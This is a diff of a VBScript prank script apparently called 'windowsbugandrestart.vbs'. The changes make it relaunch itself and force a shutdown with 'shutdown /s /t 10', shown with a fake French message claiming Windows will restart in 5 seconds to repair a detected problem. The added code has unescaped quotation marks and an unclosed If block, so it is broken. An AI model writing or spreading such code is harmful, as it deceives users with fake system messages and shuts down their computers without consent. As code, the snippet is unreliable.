@@ -9,8 +9,13 @@ End If
 If intro = 2 Then
 restartprogcommande = "windowsbugandrestart.vbs"
 createobject("wscript.shell").run """"+restartprogcommande+"""",1,false
+createobject("wscript.shell").run """"+restartprogcommande+"""",1,false
+
+If restartwindows = 1 Then
+restartwindows = "shutdown /s /t 10 /c "Votre ordinateur va redémarrer dans 5 secondes. Windows va essayer de réparer le problème détecté.""
+createobject("wscript.shell").run """"+restartwindows+"""",1,false
 
 If restartwindows = 2 Then
 WScript.Sleep(3000)
-restartprogcommande = "C:\Program Files\Mozilla Firefox\firefox.exe"
+restartprogcommande = "windowsbugandrestart.vbs"
 createobject("wscript.shell").run """"+restartprogcommande+"""",1,false
